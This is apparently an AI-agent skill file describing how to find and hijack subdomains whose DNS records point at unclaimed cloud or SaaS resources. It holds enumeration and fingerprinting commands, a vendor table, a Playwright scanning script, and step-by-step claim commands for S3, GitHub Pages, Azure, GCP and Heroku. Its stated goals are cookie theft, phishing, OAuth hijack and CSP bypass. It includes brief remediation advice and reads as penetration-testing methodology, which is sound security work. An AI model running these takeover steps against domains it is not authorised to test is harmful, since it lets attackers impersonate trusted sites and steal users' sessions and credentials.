---
name: subdomain-takeover
description: Detect and exploit dangling DNS records (CNAME, NS, MX, A, AWS/Azure/GCP/Heroku/GitHub/Shopify/S3 and 40+ services) to hijack subdomains for cookie theft, phishing, and CSP bypass.
---

# Subdomain Takeover

## When to use this skill

- Enumeration shows a subdomain whose DNS record points at a service that **no longer claims the resource** (deleted cloud asset, expired vendor project, removed GitHub repo/page, unregistered AWS/Azure/GCP name).
- The subdomain returns NXDOMAIN for its target, a vendor "not found" page, a 404 with a service-specific banner, or "There isn't a GitHub Pages site here" / "NoSuchBucket" / "404 Not Found: nginx" fingerprints.
- Scope includes wildcard DNS, legacy DNS zones, and historical/CT-log records — the juiciest targets are records nobody has looked at in years.
- Goal: server arbitrary content on a trusted domain for cookie theft, phishing, OAuth hijack, or CSP bypass.

## Core concept

A DNS record points to a provider-managed resource. The resource is deleted/unclaimed, but the **record survives**. Anyone who can register that resource on the provider controls what the subdomain serves — because the subdomain's request lands on infrastructure the attacker now owns.

```
subs.target.com  CNAME  dead-bucket.s3.amazonaws.com   ← record still exists
                 ↓
dead-bucket.s3.amazonaws.com → NoSuchBucket            ← resource unclaimed
                 ↓
attacker creates bucket "dead-bucket"                  ← full control of subs.target.com
```

The vulnerability chain requires **both**: the record exists AND the vendor allows (or allowed) claiming the name without domain validation. Severity derives from cookie scope (cookies are host-isolated but domain-shared), TLS trust on the hijacked host, and internal trust of `*.target.com`.

## Exploitation Steps

### 1. Enumerate candidate subdomains

Passive first — never touch the target's infra before triage:

```bash
# CT logs + passive sources
subfinder -d target.com -all -passive -o subs_passive.txt
amass enum -passive -d target.com -o subs_amass.txt
crt.sh dump: curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u
# wildcard/legacy detection: look for records in DNS zone transfers or old DNS dumps
```

Active only after scoping:

```bash
subfinder -d target.com -all -o subs.txt
amass enum -active -d target.com >> subs.txt
sort -u subs*.txt -o subs.txt
```

### 2. Resolve and find dangling records

```bash
# Bulk resolve; keep only hosts with CNAME/NS/MX pointing to vendor infra
cat subs.txt | dnsx -silent -a -cname -resp -o resolved.txt
# Extract vendor-pointed targets
grep -oP '(?<=\[cname\]\s)[^ ]+' resolved.txt | sort -u > cnames.txt
# A record that serves a vendor "not found" page is also a candidate (S3/Heroku style)
httpx -l subs.txt -status-code -title -tech-detect -cdn -o http.txt
```

Red flags per record type:
- **CNAME** → vendor hostname not resolvable/404s with vendor fingerprint.
- **NS** → the child zone is delegable — you can run a nameserver for `*.sub.target.com`.
- **MX** → receive mail for the domain (reset-token interception, SPF bypass via subdomain).
- **A** to cloud IP ranges → often S3/Heroku/CloudFront static "not found".

### 3. Fingerprint the vendor

Match the HTTP response against the canonical table — `github.com/EdOverflow/can-i-take-over-xyz`. Key fingerprints:

| Service | Fingerprint | Claim method |
|---|---|---|
| AWS S3 | `NoSuchBucket` | Create bucket with that exact name |
| GitHub Pages | `There isn't a GitHub Pages site here` | Create repo + CNAME |
| Heroku | `No such app` | `heroku create <name>` |
| Azure (storage static site) | `404 - Web site not found` | `az storage account create -n <name>` |
| Azure (App Service) | `404 Web Site not found` | Create App Service with that hostname |
| CloudFront | `Bad request` + `ERROR: The request could not be satisfied` | Create CloudFront distro with alt-domain |
| Fastly | `Fastly error: unknown domain` | Register domain on a Fastly service |
| Shopify | `Sorry, this shop is currently unavailable` | Create shop with that subdomain |
| Tumblr | `There's nothing here.` | Register that subdomain |
| Squarespace | `website expired` | Register domain |
| Zendesk | `Help Center Closed` | Create Zendesk with that subdomain |
| Intercom | `This page is reserved for artistic dogs` | Create Intercom custom domain |
| Surge.sh | `project not found` | `surge <sub>` |
| Bitbucket | `Repository not found` | Create repo + configure domain |
| Netlify | `Not Found` (site) / custom domain claiming | Create site with that domain |
| Vercel | `DEPLOYMENT_NOT_FOUND` | `vercel` a project with that domain |
| Agora / Webflow / Ghost / Cargo | vendor-specific 404s | register the subdomain |

Automate the fingerprint pass:

```bash
nuclei -l http.txt -t takeovers/ -severity high,critical
subzy run --targets subs.txt --hide_fails
```

Cross-check every automated hit manually — tooling over-triggers on expired-but-claimed records.

### 4. Claim and exploit

Create the exact resource name and serve your content:

```bash
# S3 takeover:
aws s3api create-bucket --bucket <exact-name> --region us-east-1
echo "PWNED" | aws s3 cp - s3://<exact-name>/index.html --acl public-read
curl -s https://subs.target.com/ | grep "Pwned"
# GitHub Pages takeover:
# sub → user.github.io (NXDOMAIN or 404 "There isn't a GitHub Pages site here")
# Create repo named <user>.github.io (or project repo) under that user, add CNAME file:
git init && echo "subs.target.com" > CNAME && git add . && git commit -m x && git push
# Azure takeover (storage static site):
az storage account create -n <exact-name> -g rg -l eastus --sku Standard_LRS
az storage blob service-properties update --account-name <name> --static-website --index-document index.html
az storage blob upload -f index.html -c '$web' -n index.html --account-name <name>
# If the record points to azurewebsites.net, use Azure Function/Web App with that hostname instead.
```

### 5. Hunting automation

```bash
# 1. Enumerate subdomains (passive + active)
subfinder -d target.com -all -o subs.txt && amass enum -passive -d target.com >> subs.txt
# 2. Resolve alive hosts -- dropped CNAMEs survive DNS but not HTTP
cat subs.txt | dnsx -silent -a -cname -resp -o alive.txt
# 3. Extract CNAMEs and diff against the fingerprint table
grep -oP '(?<=\[cname\]\s)[^ ]+' alive.txt | sort -u > cnames.txt
# 4. HTTP fingerprint the dangling hosts
cat cnames.txt | httpx -status-code -title -tech-detect -o http.txt
# 5. Match against vendor fingerprints (can-i-take-over-xyz list / nuclei takeover templates)
nuclei -l http.txt -t takeovers/ -severity high,critical
# 6. Cross-check every automated hit manually against the vendor's current error banner
#    -- tooling over-triggers on soft claims (expired-but-claimed records).
```

Headless-hunting pattern (parallel per-host service probing via Playwright/Puppeteer):

```javascript
// Detect vendor 404 fingerprints at scale, screenshot proof, dedupe soft-claims
const { chromium } = require('playwright');
const fs = require('fs');
const FINGERPRINTS = [
  ["AWS S3",            /NoSuchBucket/],
  ["GitHub Pages",      /There isn't a GitHub Pages site here/],
  ["Heroku",            /No such app/],
  ["Azure Storage",     /404 - Web site not found/],
  ["CloudFront",        /ERROR: The request could not be satisfied/],
  ["Fastly",            /Fastly error: unknown domain/],
  ["Shopify",           /Sorry, this shop is currently unavailable/],
  ["Vercel",            /DEPLOYMENT_NOT_FOUND/],
  ["Netlify",           /Not Found.*deploy/],
  ["Zendesk",           /Help Center Closed/],
  ["Tumblr",            /There's nothing here/],
  ["Surge.sh",          /project not found/],
];
(async () => {
  const hosts = fs.readFileSync('cnames.txt','utf8').split('\n').filter(Boolean);
  const browser = await chromium.launch();
  const ctx = await browser.newContext();
  for (const host of hosts) {
    const page = await ctx.newPage();
    try {
      const resp = await page.goto(`https://${host}`, { timeout: 15000 });
      const body = await page.content();
      for (const [svc, re] of FINGERPRINTS) {
        if (re.test(body)) {
          await page.screenshot({ path: `proof/${host}.png` });
          console.log(`[HIT] ${host} → ${svc}`);
          fs.appendFileSync('takeover_candidates.tsv', `${host}\t${svc}\t${resp?.status()}\n`);
          break;
        }
      }
    } catch (e) { /* NXDOMAIN / TLS error → note and continue */ }
    await page.close();
  }
  await browser.close();
})();
```

Cloud/CDN target matrix — claim method per vendor:

**AWS:**
```bash
# S3: create bucket with exact name; if region ≠ us-east-1 must specify region
aws s3api create-bucket --bucket <name> --region <region> --create-bucket-configuration LocationConstraint=<region>
# CloudFront: create distribution, add <sub>.target.com in Alternate Domain Names (CNAME)
#   requires valid cert for that hostname → use ACM in us-east-1, DNS-validated (needs the DNS record; for takeover often impossible unless you control DNS) — report as "partial" if cert unobtainable
# Lightsail/EC2/Elastic Beanstalk: claim the underlying hostname the CNAME points to
```

**Azure:**
```bash
# Storage static site: name must be globally unique, 3-24 lowercase alphanumeric
az storage account create -n <name> -g <rg> -l eastus --sku Standard_LRS
az storage blob service-properties update --account-name <name> --static-website --index-document index.html
az storage blob upload -f index.html -c '$web' -n index.html --account-name <name>
# App Service (azurewebsites.net): create app with hostname <sub>.target.com
az webapp create -g <rg> -p <plan> -n <sub-domain-app>
az webapp config hostname add --webapp-name <sub-domain-app> --resource-group <rg> --hostname <sub>.target.com
# Azure CDN / Front Door: create profile, add <sub>.target.com as custom domain
```

**GCP:**
```bash
# Cloud Storage static site: bucket name = subdomain
gcloud storage buckets create gs://<sub>.target.com --project=<proj>
gcloud storage cp index.html gs://<sub>.target.com/index.html
# Firebase Hosting: create site with the subdomain as custom domain (needs DNS TXT → often blocked; report partial)
# Cloud Run / Functions: domain mapping requires DNS ownership — usually NOT exploitable via CNAME alone
```

**Other:**
```bash
# Heroku
heroku create <name> && heroku domains:add <sub>.target.com -a <name>
# GitHub Pages
# (as in step 4)
# Fastly / Cloudflare / Akamai: create service, add domain, upload content
# Shopify / Tumblr / Squarespace / Zendesk / Intercom / Webflow: register the subdomain on the vendor SaaS
```

### 6. Verification & Deliverables

- **Confirmed**: takeover page served at the subdomain (screenshot), plus DNS record + fingerprint response captured *before* the claim.
- **Impact**: cookie theft across `*.target.com`, OAuth redirect hijack, phishing on trusted domain, CSP bypass, CSRF token theft, password-reset interception.
- **Remediation**: remove DNS records immediately when decommissioning; use "claim-then-verify" for vendor setup; continuous monitoring (can-i-take-over-xyz + nuclei cron); prefer apex-level validation for third-party integrations; set `CAA` and registrar lock; monitor for `NXDOMAIN` on CNAME targets.
- **Artifacts**: DNS records (dig output), fingerprint HTTP response, vendor service identified, takeover proof screenshot, remediation advice per record.
